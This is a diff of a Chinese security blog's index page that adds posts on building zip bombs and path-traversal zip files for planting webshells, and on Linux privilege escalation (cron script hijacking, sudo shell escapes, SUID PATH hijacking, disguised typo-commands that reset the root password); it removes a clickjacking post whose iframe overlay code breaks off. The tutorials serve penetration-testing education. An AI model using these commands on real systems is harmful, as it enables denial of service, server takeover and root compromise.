@@ -258,6 +258,423 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/zip炸弹和跨目录zip文件的构造/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/02/15/zip炸弹和跨目录zip文件的构造/" itemprop="url">
+                  zip炸弹和跨目录zip文件的构造
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T16:45:05+08:00">
+                2020-02-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/02/15/zip炸弹和跨目录zip文件的构造/" class="leancloud_visitors" data-flag-title="zip炸弹和跨目录zip文件的构造">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在对可上传zip文件的上传点进行测试时，除了一般的上传漏洞，我们也要关注其后台代码对zip文件解压后的大小和跨目录解压问题的检查。博主在本文中将介绍测试上述两种问题所用到的zip文件如何构造。</p>
+<h2 id="什么是zip炸弹"><a href="#什么是zip炸弹" class="headerlink" title="什么是zip炸弹"></a>什么是zip炸弹</h2><p>zip炸弹就是一个高压缩比的zip文件，它本身可能只有几M或几十M的大小，但是解压缩之后会产生巨大的数据量，会解压到几十G的大小甚至更大，这种zip文件会对解压缩的系统造成严重的资源负担，影响目标系统业务甚至达到使系统崩溃的结果。</p>
+<h2 id="可用于攻击何种系统"><a href="#可用于攻击何种系统" class="headerlink" title="可用于攻击何种系统"></a>可用于攻击何种系统</h2><p>zip炸弹的危害主要在于它解压时消耗的资源和解压后占用的资源，所以主要会对未进行压缩文件解压后大小校验就直接解压的系统造成危害。</p>
+<h2 id="如何制作zip炸弹"><a href="#如何制作zip炸弹" class="headerlink" title="如何制作zip炸弹"></a>如何制作zip炸弹</h2><p>制作zip炸弹的方法非常简单，我们可以使用linux自带的命令制作。</p>
+<h3 id="1-制造一个较大的csv数据文件"><a href="#1-制造一个较大的csv数据文件" class="headerlink" title="1.制造一个较大的csv数据文件"></a>1.制造一个较大的csv数据文件</h3><p>如创建一个1G的csv数据文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero count=$((1024*1024)) bs=1024 of=bigFile.csv</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip01.png" alt=""></p>
+<p>我们也可以通过更改count的值和bs的值创建更大的csv数据文件<br>如10G的csv数据文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero count=$((1024*1024)) bs=10240 of=bigFile.csv</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-使用zip-9命令压缩"><a href="#2-使用zip-9命令压缩" class="headerlink" title="2.使用zip -9命令压缩"></a>2.使用zip -9命令压缩</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -9 bigFile.zip bigFile.csv</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip02.png" alt=""></p>
+<p>可以从图中看到，1G的csv文件被压缩到了1018K，我们将这个不到1M的zip文件上传，一般都能通过网站的上传文件大小限制，对自身上传时资源耗费很低，但是服务器解压过程中和解压之后占用的资源就比较多了。</p>
+<p>本文中用到的只是一个简单的例子，实际进攻时我们使用的zip文件解压后大小会更大，多达几十或上百TB级别，而且压缩比也会更高，压缩文件实际大小可能只有十几MB。会对服务器造成很严重的资源占用。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip03.png" alt=""></p>
+<p>我们使用这些超高压缩比的zip文件时也不需要自己构造，github中可以找到很多已经打包好的zip炸弹。</p>
+<h2 id="什么是zip跨目录"><a href="#什么是zip跨目录" class="headerlink" title="什么是zip跨目录"></a>什么是zip跨目录</h2><p>zip跨目录与我们常见的跨目录问题类似，都是使用../来进行相对路径的目录跨越，zip文件中携带含有../的文件，在解压过程中这些文件名被解析成相对路径，解压后就会将这些文件传递到其他目录。</p>
+<h2 id="可用于攻击何种系统-1"><a href="#可用于攻击何种系统-1" class="headerlink" title="可用于攻击何种系统"></a>可用于攻击何种系统</h2><p>存在对zip文件解压的系统，程序实现代码未对携带的../等进行过滤，且解压时使用的解压程序没有跨目录的保护机制，这些文件才会被跨目录。</p>
+<p>linux中默认的unzip，即使正常使用解压了含有../的zip文件，也是不会被跨目录的，但是加入-:参数就会产生这种问题。所以这类问题大多数出现在程序的实现中，程序中调用了某些方法来进行文件解压，但是没有严格判断造成的。</p>
+<p>zip跨目录最典型的攻击手段用于存在上传后缀限制的web系统中，如某些接口仅允许上传压缩文件，上传后会自动解压，但是上传路径我们无法访问。这时候攻击者就会构造一个webshell文件并添加为携带目录信息的zip文件，被自动解压后就会将webshell解压到可访问目录，就会造成getshell。</p>
+<h2 id="如何制作跨目录zip文件"><a href="#如何制作跨目录zip文件" class="headerlink" title="如何制作跨目录zip文件"></a>如何制作跨目录zip文件</h2><p>制作跨目录zip文件的方式很方便，我们可以先制作好再上传，也可以在上传的过程中使用burpsuite改zip文件信息来构造。需要改的信息都是相同的。</p>
+<h3 id="1-使用notepad-修改"><a href="#1-使用notepad-修改" class="headerlink" title="1.使用notepad++修改"></a>1.使用notepad++修改</h3><p>首先我们需要创建一个文件名较长的文件，如1234567890.txt。</p>
+<p>然后将其压缩为zip格式。</p>
+<p>使用notepad++打开zip格式的文件，寻找两处很明显的1234567890.txt字段，修改成../../7890.txt，保存后重新打开zip文件就成功了。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip04.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip05.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip06.png" alt=""></p>
+<p>在修改的过程中要确保修改前的文件名和修改后的文件名长度一致，由于一个../就占了三个长度，所以在前面才需要文件名较长，文件名越长，可以跨越的目录层数越多。</p>
+<h3 id="2-使用burpsuite修改"><a href="#2-使用burpsuite修改" class="headerlink" title="2.使用burpsuite修改"></a>2.使用burpsuite修改</h3><p>上传过程中，使用burpsuite抓包，直接修改和notepad++中要修改的同样的两处字段提交即可。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/linux常见提权方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/02/12/linux常见提权方式总结/" itemprop="url">
+                  linux常见提权方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-12T23:00:00+08:00">
+                2020-02-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/提权/" itemprop="url" rel="index">
+                    <span itemprop="name">提权</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/02/12/linux常见提权方式总结/" class="leancloud_visitors" data-flag-title="linux常见提权方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提权是渗透测试中重要的一步，我们通常使用各种内核漏洞的cve来进行提权，但是在本文中博主想介绍一些，由于人为配置不当造成的提权方法，开阔提权时的思路。</p>
+<h2 id="1-crontab定时任务提权"><a href="#1-crontab定时任务提权" class="headerlink" title="1. crontab定时任务提权"></a>1. crontab定时任务提权</h2><p>crontab是cron table的简写，它是cron的配置文件，而cron是linux内置管理定时任务的进程。</p>
+<p>我们可以通过如下指令来编辑和查看当前工作表命令 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab [-u username]　　　　//省略用户表表示操作当前用户的crontab</span><br><span class="line">    -e      (编辑工作表)</span><br><span class="line">    -l      (列出工作表里的命令)</span><br><span class="line">    -r      (删除工作表)</span><br></pre></td></tr></table></figure>
+<p>更多的crontab操作可以参考教程 <a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a> </p>
+<h3 id="1-1-root权限定时任务脚本普通用户可写"><a href="#1-1-root权限定时任务脚本普通用户可写" class="headerlink" title="1.1 root权限定时任务脚本普通用户可写"></a>1.1 root权限定时任务脚本普通用户可写</h3><p>以root权限执行的定时任务或其所在文件夹，低权限用户拥有写权限，则可进行提权。</p>
+<p>示例：</p>
+<p>切换到root用户，输入crontab -e，添加一个一分钟执行一次的shell脚本，然后赋予此脚本执行权限和其他用户可写权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * /home/test/cron.sh</span><br></pre></td></tr></table></figure>
+<p>开启其他shell，切换到普通用户，修改脚本内容为重置root密码，或者添加此普通用户权限等操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:password&quot; | chpasswd</span><br></pre></td></tr></table></figure>
+<p>然后su root使用更改后密码切换至root</p>
+<p>如果文件不可写而文件夹可写的情况，如下图情况，可以删除到整个路径，然后重新由普通用户创建路径和其中脚本，就变成可写的情况了。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo01.png" alt=""></p>
+<h3 id="1-2-root权限定时任务调用的脚本普通用户可写"><a href="#1-2-root权限定时任务调用的脚本普通用户可写" class="headerlink" title="1.2 root权限定时任务调用的脚本普通用户可写"></a>1.2 root权限定时任务调用的脚本普通用户可写</h3><p>很多时候，定时任务并不是孤立存在的，它会去调用很多别的shell脚本来完成一些操作，而root权限的定时任务调用的脚本也会以root权限执行，所以我们仍需要关注其调用的其他脚本是否普通用户可写，如果可写，仍然可以提权。</p>
+<p>查询此类脚本的方法是首先找到root的定时任务 xxx.sh，然后在文件种查找其他shell脚本即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;*.sh&quot; xxx.sh</span><br></pre></td></tr></table></figure>
+<h2 id="2-sudo脚本提权"><a href="#2-sudo脚本提权" class="headerlink" title="2. sudo脚本提权"></a>2. sudo脚本提权</h2><p>sudo脚本提权，主要和/etc/sudoers配置文件有关，主要由以下三种配置引起：</p>
+<ul>
+<li><p>1.在sudoers文件中配置的脚本在运行时默认以root权限执行</p>
+</li>
+<li><p>2.在sudoers文件中配置的文件夹，内部所有脚本默认以root权限执行</p>
+</li>
+<li><p>3.在sudoers文件中配置的系统命令，默认以root权限执行</p>
+</li>
+</ul>
+<p>而这三种配置就引出了三种提权方式，在这里作者分别配置了，/home/test/sudotest.sh文件，/home/test/sudo文件夹，以及zip,tar,more三个命令，分别对应了上述三种情况</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo02.png" alt=""></p>
+<h3 id="2-1-sudoers文件中配置的脚本文件"><a href="#2-1-sudoers文件中配置的脚本文件" class="headerlink" title="2.1 sudoers文件中配置的脚本文件"></a>2.1 sudoers文件中配置的脚本文件</h3><p>/etc/sudoers中配置的sudo脚本文件低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p>
+<p>使用如下命令即可复现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/test</span><br><span class="line">echo &quot;bin/bash&quot; &gt; sudotest.sh</span><br><span class="line">chmod +x sudotest.sh</span><br><span class="line">sudo ./sudotest.sh</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo03.png" alt=""></p>
+<h3 id="2-2-sudoers文件中配置的文件夹"><a href="#2-2-sudoers文件中配置的文件夹" class="headerlink" title="2.2 sudoers文件中配置的文件夹"></a>2.2 sudoers文件中配置的文件夹</h3><p>/etc/sudoers中配置的sudo文件夹低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p>
+<p>在之前的配置中我们可以看到，在/home/test/sudo这个test用户可控目录以test随意创建脚本使用sudo执行均是免root密码的。</p>
+<p>使用如下命令即可复现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/test/sudo</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; test.sh</span><br><span class="line">chmod +x test.sh</span><br><span class="line">sudo ./test.sh</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-3-使用系统命令sudo提权"><a href="#2-3-使用系统命令sudo提权" class="headerlink" title="2.3 使用系统命令sudo提权"></a>2.3 使用系统命令sudo提权</h3><p>如vi，more，less，tar，zip，awk，git，find等命令，如在/etc/sudoers中配置，即存在sudo提权</p>
+<p>vi,more,less的命令sudo提权方式都是使用对应命令sudo打开一个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi filename</span><br><span class="line">sudo more filename</span><br><span class="line">sudo less filename</span><br></pre></td></tr></table></figure></p>
+<p>然后在打开界面输入!/bin/bash，即可获得root权限的shell</p>
+<p>zip命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip filename.zip 123.txt -T --unzip-command=&quot;!/bin/bash&quot;</span><br></pre></td></tr></table></figure></p>
+<p>awk命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>git命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help status</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>find命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /bin/ -name ls -exec /bin/bash \;</span><br></pre></td></tr></table></figure></p>
+<h2 id="3-环境变量提权"><a href="#3-环境变量提权" class="headerlink" title="3. 环境变量提权"></a>3. 环境变量提权</h2><h3 id="3-1-具有S权限位的脚本"><a href="#3-1-具有S权限位的脚本" class="headerlink" title="3.1 具有S权限位的脚本"></a>3.1 具有S权限位的脚本</h3><p>Linux中通过设置suid，可以让程序的执行者临时拥有属主的权限，可以使用下面的命令查找具有suid的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>然后具有s权限位的这些脚本中如果存在可控环境变量。如脚本中存在调用ps程序，我们可以在低权限用户可写目录中写一个ps文件，内容为/bin/bash，然后将此目录添加到环境变量最优先寻找的目录，再执行脚本，脚本就会以root权限触发/bin/bash，就产生了一个root权限的shell，完成提权。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /home/test/ps</span><br><span class="line">export PATH=/home/test:$PATH</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-2-root的环境变量设置了用户可控目录"><a href="#3-2-root的环境变量设置了用户可控目录" class="headerlink" title="3.2 root的环境变量设置了用户可控目录"></a>3.2 root的环境变量设置了用户可控目录</h3><p>root的$PATH若设置了用户可控的目录，用户可以在此可控目录写入一些命令并诱导root用户输入，在这些文件中填充修改root密码的命令或给其他用户添加权限等命令，然后当root用户被诱导输入一些环境变量中配置的指令时就会执行这些命令。通常会配置一些容易输错的单词，并在后面加入返回命令不存在的提示。</p>
+<p>如文件名设置为whomai，与正常的命令whoami颠倒了一点顺序，有时手快会输入错误。<br>然后在whoami中配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:password&quot; |chpasswd &gt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line">echo &quot;bash: whomai: 未找到命令&quot;</span><br></pre></td></tr></table></figure></p>
+<p>当然我们可以配置非常多的文件名来增加触发概率。</p>
+<h3 id="3-3-su切换而不是su-切换导致携带用户环境变量"><a href="#3-3-su切换而不是su-切换导致携带用户环境变量" class="headerlink" title="3.3 su切换而不是su -切换导致携带用户环境变量"></a>3.3 su切换而不是su -切换导致携带用户环境变量</h3><p>linux系统在使用su切换时，会携带当前用户的环境变量，使用su -则不会，如果在当前用户环境变量设置如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/home/test/ps:$PATH</span><br></pre></td></tr></table></figure></p>
+<p>编辑一个ps文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:password&quot; |chpasswd &gt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line">ps</span><br></pre></td></tr></table></figure></p>
+<p>那么在从此用户切换到root的管理员，在使用ps时就会修改掉root用户密码。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/04/ida远程调试linux程序/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1970,435 +2387,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/14/点击劫持/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/09/14/点击劫持/" itemprop="url">
-                  点击劫持
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-14T11:52:07+08:00">
-                2018-09-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/09/14/点击劫持/" class="leancloud_visitors" data-flag-title="点击劫持">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-点击劫持-clickjacking"><a href="#0x00-点击劫持-clickjacking" class="headerlink" title="0x00 点击劫持(clickjacking)"></a>0x00 点击劫持(clickjacking)</h2><p>点击劫持，clickjacking，也被称为UI-覆盖攻击。它是通过覆盖不可见的框架误导受害者点击。虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。这种攻击利用了HTML中iframe标签的透明属性。</p>
-<h2 id="0x01-点击劫持基础步骤"><a href="#0x01-点击劫持基础步骤" class="headerlink" title="0x01 点击劫持基础步骤"></a>0x01 点击劫持基础步骤</h2><p>攻击者创建一个网页，并用iframe包含另一个目标网站。（如淘宝等）</p>
-<p>调整iframe属性使目标网站透明。</p>
-<p>根据想要诱导受害者点击目标网站上按键的位置，在自己创建的网站同样的位置上布置一个按钮。</p>
-<p>对方在无法看到iframe界面的情况下点击按钮，实际上在目标网站上做了危险操作。（如购买，转账）</p>
-<h2 id="0x02-点击劫持实现"><a href="#0x02-点击劫持实现" class="headerlink" title="0x02 点击劫持实现"></a>0x02 点击劫持实现</h2><p>点击劫持最常见的方法就是上面所做的基础步骤，我们可以自己写一个网站实现一下。</p>
-<p>先贴代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">	body&#123;</span><br><span class="line">	      margin:0px;</span><br><span class="line">		  border:0px;</span><br><span class="line">		  padding:0px;</span><br><span class="line">		  position: relative;</span><br><span class="line">	  &#125;</span><br><span class="line">	iframe&#123;</span><br><span class="line">		z-index:1;</span><br><span class="line">		border:0px;</span><br><span class="line">		</span><br><span class="line">		-moz-opacity:0;</span><br><span class="line">		opacity:0;</span><br><span class="line">		filter:alpha(opacity=0);</span><br><span class="line">	&#125;</span><br><span class="line">	.a input&#123;</span><br><span class="line">		z-index:0;</span><br><span class="line">		width: 500px;</span><br><span class="line">		height: 38px;</span><br><span class="line">		padding: 9px  7px;</span><br><span class="line">	    vertical-align: top;</span><br><span class="line">	    /*outline: none;</span><br><span class="line">		border: none;</span><br><span class="line">	    box-shadow: none;*/</span><br><span class="line">	&#125;</span><br><span class="line">	.a form&#123;</span><br><span class="line">		z-index:0;</span><br><span class="line">		position: absolute;</span><br><span class="line">		top: 182px;</span><br><span class="line">		left: 50%;</span><br><span class="line">		margin-left: -319px;</span><br><span class="line">		width: 638px;</span><br><span class="line">	&#125;</span><br><span class="line">	button&#123;</span><br><span class="line">		cursor: pointer;</span><br><span class="line">	    width: 102px;</span><br><span class="line">	    height: 38px;</span><br><span class="line">	    line-height: 38px;</span><br><span class="line">	    padding: 0;</span><br><span class="line">	    border: 0;</span><br><span class="line">	    background: none;</span><br><span class="line">	    background-color: #38f;</span><br><span class="line">	    font-size: 16px;</span><br><span class="line">	    color: white;</span><br><span class="line">	    box-shadow: none;</span><br><span class="line">	    font-weight: normal;</span><br><span class="line">	    position: absolute;</span><br><span class="line">	    right: 0;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;a&quot; ;&gt;</span><br><span class="line">&lt;form action=&quot;xxxx.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;test&quot; &gt;</span><br><span class="line">	&lt;button&gt;Try&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;iframe src=&quot;http://www.baidu.com/&quot; id=&quot;iframepage&quot; 